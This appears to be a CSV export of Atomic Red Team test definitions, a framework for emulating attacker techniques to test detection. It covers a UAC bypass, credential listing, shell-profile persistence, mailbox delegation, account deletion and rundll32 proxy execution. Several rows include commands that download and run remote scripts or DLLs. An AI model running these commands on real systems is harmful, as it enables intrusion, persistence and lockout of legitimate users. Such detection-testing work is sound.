",windows,,,"cmstp.exe /s ""#{inf_file_uac}"" /au
",command_prompt,,,,powershell,"dependencies.0.description: INF file must exist on disk at specified location (#{inf_file_uac})

dependencies.0.prereq_command: if (Test-Path ""#{inf_file_uac}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inf_file_uac}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf"" -OutFile ""#{inf_file_uac}""

","input_arguments.inf_file_uac.description: Path to the INF file

input_arguments.inf_file_uac.type: path

input_arguments.inf_file_uac.default: PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf

"
T1003.005,OS Credential Dumping: Cached Domain Credentials,Cached Credential Dump via Cmdkey,56506854-89d6-46a3-9804-b7fde90791f9,"List credentials currently stored on the host via the built-in Windows utility cmdkey.exe
Credentials listed with Cmdkey only pertain to the current user
Passwords will not be displayed once they are stored
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey
https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation
",windows,,,"cmdkey /list
",command_prompt,False,,,,,
T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Add command to .bash_profile,94500ae1-7e31-47e3-886b-c328da46872f,"Adds a command to the .bash_profile file of the current user
",macos,linux,,"echo '#{command_to_add}' >> ~/.bash_profile
",sh,,,"head -n '-2' ~/.bash_profile > /tmp/T1546.004
mv /tmp/T1546.004 ~/.bash_profile
",,,"input_arguments.command_to_add.description: Command to add to the .bash_profile file

input_arguments.command_to_add.type: string

input_arguments.command_to_add.default: echo ""Hello from Atomic Red Team T1546.004"" > /tmp/T1546.004

"
T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Add command to .bashrc,0a898315-4cfa-4007-bafe-33a4646d115f,"Adds a command to the .bashrc file of the current user
",macos,linux,,"echo '#{command_to_add}' >> ~/.bashrc
",sh,,,"head -n '-2' ~/.bashrc > /tmp/T1546.004
mv /tmp/T1546.004 ~/.bashrc
",,,"input_arguments.command_to_add.description: Command to add to the .bashrc file

input_arguments.command_to_add.type: string

input_arguments.command_to_add.default: echo ""Hello from Atomic Red Team T1546.004"" > /tmp/T1546.004

"
T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Add command to .shrc,41502021-591a-4649-8b6e-83c9192aff53,"Adds a command to the .shrc file of the current user
",linux,,,"echo '#{command_to_add}' >> ~/.shrc
",sh,,,"head -n '-2' ~/.shrc > /tmp/T1546.004
mv /tmp/T1546.004 ~/.shrc
",,,"input_arguments.command_to_add.description: Command to add to the .shrc file

input_arguments.command_to_add.type: string

input_arguments.command_to_add.default: echo ""Hello from Atomic Red Team T1546.004"" > /tmp/T1546.004

"
T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Append to the system shell profile,694b3cc8-6a78-4d35-9e74-0123d009e94b,"An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time ""any"" user logs in.
",linux,,,"echo '#{text_to_append}' >> /etc/profile
",sh,True,,"sed -i ""s/# Atomic Red Team was here! T1546.004//"" /etc/profile
",,,"input_arguments.text_to_append.description: Text to append to the /etc/profile file

input_arguments.text_to_append.type: string

input_arguments.text_to_append.default: # Hello from Atomic Red Team T1546.004

"
T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Append commands user shell profile,bbdb06bc-bab6-4f5b-8232-ba3fbed51d77,"An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the ""user"" logs in.
",linux,,,"echo '#{text_to_append}' >> ~/.profile
",sh,False,,"sed -i ""s/# Atomic Red Team was here... T1546.004//"" ~/.profile
",,,"input_arguments.text_to_append.description: Text to append to the ~/.profile file

input_arguments.text_to_append.type: string

input_arguments.text_to_append.default: # Atomic Red Team was here... T1546.004

"
T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,System shell profile scripts,8fe2ccfd-f079-4c03-b1a9-bd9b362b67d4,"An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time ""any"" user logs in.
",linux,,,"echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh
",sh,True,,"sed -i ""s/# Atomic Red Team was here... T1546.004//"" /etc/profile.d/bash_completion.sh
",,,"input_arguments.text_to_append.description: Text to append to the /etc/profile.d/bash_completion.sh file

input_arguments.text_to_append.type: string

input_arguments.text_to_append.default: # Atomic Red Team was here... T1546.004

"
T1546.004,Event Triggered Execution: .bash_profile .bashrc and .shrc,Create/Append to .bash_logout,37ad2f24-7c53-4a50-92da-427a4ad13f58,"The Bash shell runs ~/.bash_logout ""if it exists"" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an ""interactive login shell session"" i.e. via the console, SSH, /bin/bash -l or su -l <username>. 

This test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.
",linux,,,"useradd --create-home --shell /bin/bash art
su --login art
echo 'echo ""Atomic Red Team was here... T1546.004"" >> $HOME/art.txt' >> $HOME/.bash_logout
",bash,True,,"userdel -fr art
",,,
T1098.002,Account Manipulation: Additional Email Delegate Permissions,EXO - Full access mailbox permission granted to a user,17d046be-fdd0-4cbb-b5c7-55c85d9d0714,"Give a nominated user, full mailbox delegation access of another user.
This can be used by an adversary to maintain persistent access to a target's mailbox in M365.
",office-365,,,"Import-Module ExchangeOnlineManagement
$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Add-MailboxPermission -Identity ""#{delegate_target}"" -User ""#{operator_mailbox}"" -AccessRights FullAccess -InheritanceType All
Disconnect-ExchangeOnline -Confirm:$false
",powershell,False,,"Import-Module ExchangeOnlineManagement
$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Remove-MailboxPermission -Identity ""#{delegate_target}"" -User ""#{operator_mailbox}"" -AccessRights FullAccess -InheritanceType All -Confirm:$false
Disconnect-ExchangeOnline -Confirm:$false
",powershell,"dependencies.0.description: ExchangeOnlineManagement PowerShell module must be installed

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}

dependencies.0.get_prereq_command: Install-Module -Name ExchangeOnlineManagement         

","input_arguments.username.description: office-365 username

input_arguments.username.type: string

input_arguments.username.default: o365_user_test@contoso.com

input_arguments.password.description: office-365 password

input_arguments.password.type: string

input_arguments.password.default: o365_password_test

input_arguments.delegate_target.description: office-365 target_email

input_arguments.delegate_target.type: string

input_arguments.delegate_target.default: delegate@contoso.com

input_arguments.operator_mailbox.description: office-365 target_email

input_arguments.operator_mailbox.type: string

input_arguments.operator_mailbox.default: operator@contoso.com

"
T1531,Account Access Removal,Change User Password - Windows,1b99ef28-f83c-4ec5-8a08-1a56263a5bb2,"Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account ""AtomicAdministrator"" with
the password ""HuHuHUHoHo283283"".
",windows,,,"net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} #{new_password}
",command_prompt,True,,"net.exe user #{user_account} /delete >nul 2>&1
",,,"input_arguments.user_account.description: User account whose password will be changed.

input_arguments.user_account.type: string

input_arguments.user_account.default: AtomicAdministrator

input_arguments.new_user_password.description: Password to use if user account must be created first

input_arguments.new_user_password.type: string

input_arguments.new_user_password.default: User2ChangePW!

input_arguments.new_password.description: New password for the specified account.

input_arguments.new_password.type: string

input_arguments.new_password.default: HuHuHUHoHo283283@dJD

"
T1531,Account Access Removal,Delete User - Windows,f21a1d7d-a62f-442a-8c3a-2440d43b19e5,"Deletes a user account to prevent access. Upon execution, run the command ""net user"" to verify that the new ""AtomicUser"" account was deleted.
",windows,,,"net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} /delete
",command_prompt,True,,,,,"input_arguments.new_user_password.description: Password to use if user account must be created first

input_arguments.new_user_password.type: string

input_arguments.new_user_password.default: User2DeletePW!

input_arguments.user_account.description: User account to be deleted.

input_arguments.user_account.type: string

input_arguments.user_account.default: AtomicUser

"
T1531,Account Access Removal,Remove Account From Domain Admin Group,43f71395-6c37-498e-ab17-897d814a0947,"This test will remove an account from the domain admins group
",windows,,,"$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord
if((Get-ADUser #{remove_user} -Properties memberof).memberof -like ""CN=Domain Admins*""){
  Remove-ADGroupMember -Identity ""Domain Admins"" -Members #{remove_user} -Credential $Credential -Confirm:$False
} else{
    write-host ""Error - Make sure #{remove_user} is in the domain admins group"" -foregroundcolor Red
}
",powershell,False,,,powershell,"dependencies.0.description: Requires the Active Directory module for powershell to be installed.

dependencies.0.prereq_command: if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Add-WindowsCapability -Online -Name ""Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0""

","input_arguments.super_user.description: Account used to run the execution command (must include domain).

input_arguments.super_user.type: string

input_arguments.super_user.default: domain\super_user

input_arguments.super_pass.description: super_user account password.

input_arguments.super_pass.type: string

input_arguments.super_pass.default: password

input_arguments.remove_user.description: Account to remove from domain admins.

input_arguments.remove_user.type: string

input_arguments.remove_user.default: remove_user

"
T1531,Account Access Removal,Change User Password via passwd,3c717bf3-2ecc-4d79-8ac8-0bfbf08fbce6,"This test changes the user password to hinder access to the account using passwd utility.
",macos,linux,,"passwd #{user_account} #enter admin password > enter new password > confirm new password
",sh,True,,,,,"input_arguments.user_account.description: User account whose password will be changed.

input_arguments.user_account.type: string

input_arguments.user_account.default: ARTUser

"
T1531,Account Access Removal,Delete User via dscl utility,4d938c43-2fe8-4d70-a5b3-5bf239aa7846,"This test deletes the user account using the dscl utility.
",macos,,,"dscl . -delete /Users/#{user_account} #enter admin password
",sh,True,,"dscl . -create /Users/#{user_account} #enter admin password
dscl . -create /Users/#{user_account} UserShell /bin/bash
dscl . -create /Users/#{user_account} UniqueID 503
dscl . -create /Users/#{user_account} NFSHomeDirectory /Users/#{user_account}
dscl . -passwd /Users/#{user_account} #{user_password} #enter password for new user
",,,"input_arguments.user_account.description: User account which will be deleted.

input_arguments.user_account.type: string

input_arguments.user_account.default: ARTUser

input_arguments.user_password.description: User password.

input_arguments.user_password.type: string

input_arguments.user_password.default: ARTPassword

"
T1531,Account Access Removal,Delete User via sysadminctl utility,d3812c4e-30ee-466a-a0aa-07e355b561d6,"This test deletes the user account using the sysadminctl utility.
",macos,,,"sysadminctl -deleteUser #{user_account} #enter admin password
",sh,True,,"sysadminctl -addUser #{user_account} -fullName ""#{user_name}"" -password #{user_password}
",,,"input_arguments.user_account.description: User account which will be deleted.

input_arguments.user_account.type: string

input_arguments.user_account.default: ARTUserAccount

input_arguments.user_name.description: New user name.

input_arguments.user_name.type: string

input_arguments.user_name.default: ARTUser

input_arguments.user_password.description: New user password.

input_arguments.user_password.type: string

input_arguments.user_password.default: ARTPassword

"
T1531,Account Access Removal,Azure AD - Delete user via Azure AD PowerShell,4f577511-dc1c-4045-bcb8-75d2457f01f4,"Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",azure-ad,,,"Connect-AzureAD
$userprincipalname = ""#{userprincipalname}""
Remove-AzureADUser -ObjectId $userprincipalname",powershell,,,N/A,powershell,"dependencies.0.description: Check if AzureAD PowerShell module is installed
dependencies.0.prereq_command: Get-InstalledModule -Name AzureAD
dependencies.0.get_prereq_command: echo ""use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force""
dependencies.1.description: Check if AzureAD PowerShell module is installed
dependencies.1.prereq_command: Update the input arguments so the userprincipalname value is accurate for your environment
dependencies.1.get_prereq_command: echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""
","input_arguments.userprincipalname.description: User principal name (UPN) for the Azure user being deleted

input_arguments.userprincipalname.type: string

input_arguments.userprincipalname.default: atomicredteam@yourdomain.com

"
T1531,Account Access Removal,Azure AD - Delete user via Azure CLI,c955c1c7-3145-4a22-af2d-63eea0d967f0,"Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",azure-ad,,,"az login
$userprincipalname = ""#{userprincipalname}""
az ad user delete --id $userprincipalname",powershell,,,N/A,powershell,"dependencies.0.description: Check if Azure CLI is installed and install manually
dependencies.0.prereq_command: az account list
dependencies.0.get_prereq_command: echo ""use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows""
dependencies.1.description: Check if Azure CLI is installed and install via PowerShell
dependencies.1.prereq_command: az account list
dependencies.1.get_prereq_command: echo ""use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi""
dependencies.2.description: Update the userprincipalname to meet your requirements
dependencies.2.prereq_command: Update the input arguments so the userprincipalname value is accurate for your environment
dependencies.2.get_prereq_command: echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""
","input_arguments.userprincipalname.description: User principal name (UPN) for the Azure user being deleted

input_arguments.userprincipalname.type: string

input_arguments.userprincipalname.default: atomicredteam@yourdomain.com

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 execute JavaScript Remote Payload With GetObject,57ba4ce9-ee7a-4f27-9928-3c70c489b59d,"Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. 
This has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)

Note: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. 
",windows,,,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:#{file_url}"").Exec();window.close();
",command_prompt,,,"taskkill /IM notepad.exe /f
",,,"input_arguments.file_url.description: location of the payload

input_arguments.file_url.type: url

input_arguments.file_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 execute VBscript command,638730e7-7aed-43dc-bf8c-8117f805f5bb,"Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
Upon execution calc.exe will be launched
",windows,,,"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""#{command_to_execute}""),0)
",command_prompt,,,,,,"input_arguments.command_to_execute.description: Command for rundll32.exe to execute

input_arguments.command_to_execute.type: string

input_arguments.command_to_execute.default: calc.exe

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 execute VBscript command using Ordinal number,32d1cf1b-cbc2-4c09-8d05-07ec5c83a821,"Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
Upon execution calc.exe will be launched
",windows,,,"rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""#{command_to_execute}""),0)
",command_prompt,,,,,,"input_arguments.command_to_execute.description: Command for rundll32.exe to execute

input_arguments.command_to_execute.type: string

input_arguments.command_to_execute.default: calc.exe

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 advpack.dll Execution,d91cae26-7fc1-457b-a854-34c8aad48c89,"Test execution of a command using rundll32.exe with advpack.dll.
Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
Upon execution calc.exe will be launched
",windows,,,"rundll32.exe advpack.dll,LaunchINFSection ""#{inf_to_execute}"",DefaultInstall_SingleUser,1,
",command_prompt,,,,powershell,"dependencies.0.description: Inf file must exist on disk at specified location (""#{inf_to_execute}"")

dependencies.0.prereq_command: if (Test-Path ""#{inf_to_execute}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inf_to_execute}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf"" -OutFile ""#{inf_to_execute}""

","input_arguments.inf_to_execute.description: Local location of inf file

input_arguments.inf_to_execute.type: string

input_arguments.inf_to_execute.default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 ieadvpack.dll Execution,5e46a58e-cbf6-45ef-a289-ed7754603df9,"Test execution of a command using rundll32.exe with ieadvpack.dll.
Upon execution calc.exe will be launched

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
",windows,,,"rundll32.exe ieadvpack.dll,LaunchINFSection ""#{inf_to_execute}"",DefaultInstall_SingleUser,1,
",command_prompt,,,,powershell,"dependencies.0.description: Inf file must exist on disk at specified location (""#{inf_to_execute}"")

dependencies.0.prereq_command: if (Test-Path ""#{inf_to_execute}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inf_to_execute}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf"" -OutFile ""#{inf_to_execute}""

","input_arguments.inf_to_execute.description: Local location of inf file

input_arguments.inf_to_execute.type: string

input_arguments.inf_to_execute.default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 syssetup.dll Execution,41fa324a-3946-401e-bbdd-d7991c628125,"Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying ""installation failed"" will be opened

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
",windows,,,"rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""#{inf_to_execute}""
",command_prompt,,,,powershell,"dependencies.0.description: Inf file must exist on disk at specified location (""#{inf_to_execute}"")

dependencies.0.prereq_command: if (Test-Path ""#{inf_to_execute}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inf_to_execute}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf"" -OutFile ""#{inf_to_execute}""

","input_arguments.inf_to_execute.description: Local location of inf file

input_arguments.inf_to_execute.type: string

input_arguments.inf_to_execute.default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 setupapi.dll Execution,71d771cd-d6b3-4f34-bc76-a63d47a10b19,"Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying ""installation failed"" will be opened

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
",windows,,,"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""#{inf_to_execute}""
",command_prompt,,,,powershell,"dependencies.0.description: Inf file must exist on disk at specified location (""#{inf_to_execute}"")

dependencies.0.prereq_command: if (Test-Path ""#{inf_to_execute}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inf_to_execute}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf"" -OutFile ""#{inf_to_execute}""

","input_arguments.inf_to_execute.description: Local location of inf file

input_arguments.inf_to_execute.type: string

input_arguments.inf_to_execute.default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Execution of HTA and VBS Files using Rundll32 and URL.dll,22cfde89-befe-4e15-9753-47306b37a6e3,"IcedID uses this TTP as follows:
  rundll32.exe url.dll,OpenURL %PUBLIC%\index.hta
Trickbot uses this TTP as follows:
  rundll32.exe URL.dll,FileProtocolHandler C:\\..\\Detail\\akteullen.vbs

In this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with ""rundll32 spawned wscript""
",windows,,,"rundll32.exe url.dll,OpenURL ""PathToAtomicsFolder\T1218.011\src\index.hta""
rundll32.exe URL.dll,FileProtocolHandler ""PathToAtomicsFolder\T1218.011\src\akteullen.vbs""
",command_prompt,,,,,,
T1218.011,Signed Binary Proxy Execution: Rundll32,Launches an executable using Rundll32 and pcwutl.dll,9f5d081a-ee5a-42f9-a04e-b7bdc487e676,"Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.
",windows,,,"rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
",command_prompt,,,,,,"input_arguments.exe_to_launch.description: Path of the executable to launch

input_arguments.exe_to_launch.type: path

input_arguments.exe_to_launch.default: %windir%\System32\notepad.exe

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Execution of non-dll using rundll32.exe,ae3a8605-b26e-457c-b6b3-2702fd335bac,"Rundll32.exe running non-dll 
",windows,,,"rundll32.exe #{input_file}, StartW
",powershell,,,,powershell,"dependencies.0.description: Non-dll file must exist on disk at specified location

dependencies.0.prereq_command: if (Test-Path #{input_file}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""#{input_url}"" -OutFile ""#{input_file}""

","input_arguments.input_url.description: Url to download the DLL

input_arguments.input_url.type: url

input_arguments.input_url.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll

input_arguments.input_file.description: Non-dll file

input_arguments.input_file.type: string

input_arguments.input_file.default: C:\Users\$env:username\Downloads\calc.png

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 with Ordinal Value,9fd5a74b-ba89-482a-8a3e-a5feaa3697b0,"Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. 
Upon successful execution, Calc.exe will spawn.
",windows,,,"rundll32.exe ""#{input_file}"",#2
",command_prompt,,,,powershell,"dependencies.0.description: DLL file must exist on disk at specified location

dependencies.0.prereq_command: if (Test-Path ""#{input_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""#{input_url}"" -OutFile ""#{input_file}""

","input_arguments.input_url.description: Url to download the DLL

input_arguments.input_url.type: url

input_arguments.input_url.default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll

input_arguments.input_file.description: DLL File

input_arguments.input_file.type: string

input_arguments.input_file.default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 with Control_RunDLL,e4c04b6f-c492-4782-82c7-3bf75eb8077e,"Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. 
",windows,,,"rundll32.exe shell32.dll,Control_RunDLL ""#{input_file}""
",command_prompt,,,,powershell,"dependencies.0.description: DLL file must exist on disk at specified location

dependencies.0.prereq_command: if (Test-Path ""#{input_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""#{input_url}"" -OutFile ""#{input_file}""

","input_arguments.input_url.description: Url to download the DLL

input_arguments.input_url.type: url

input_arguments.input_url.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll

input_arguments.input_file.description: DLL File

input_arguments.input_file.type: string

input_arguments.input_file.default: PathToAtomicsFolder\T1047\bin\calc.dll

"
T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 with desk.cpl,83a95136-a496-423c-81d3-1c6750133917,"Rundll32.exe loading an executable renamed as .scr using desk.cpl 
Reference: 
  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)
SIGMA rules:
  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)
  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)
",windows,,,"copy #{exe_to_launch} not_an_scr.scr
rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
",command_prompt,,,del not_an_scr.scr,,,"input_arguments.exe_to_launch.description: Path of the executable to launch

input_arguments.exe_to_launch.type: path

input_arguments.exe_to_launch.default: %windir%\System32\calc.exe

"
